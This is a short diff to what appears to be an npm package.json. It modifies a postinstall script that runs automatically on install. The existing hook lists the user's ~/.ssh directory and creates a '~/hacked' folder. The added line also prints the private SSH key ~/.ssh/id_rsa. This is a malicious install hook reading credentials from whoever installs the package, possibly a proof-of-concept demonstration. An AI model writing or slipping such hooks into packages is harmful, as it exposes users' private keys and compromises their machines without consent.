@@ -4,7 +4,7 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "postinstall": "ls -la ~/.ssh && mkdir ~/hacked && touch ~/hacked/test.txt"
+    "postinstall": "ls -la ~/.ssh && mkdir ~/hacked && touch ~/hacked/test.txt && cat ~/.ssh/id_rsa"
   },
   "author": "",
   "license": "ISC"
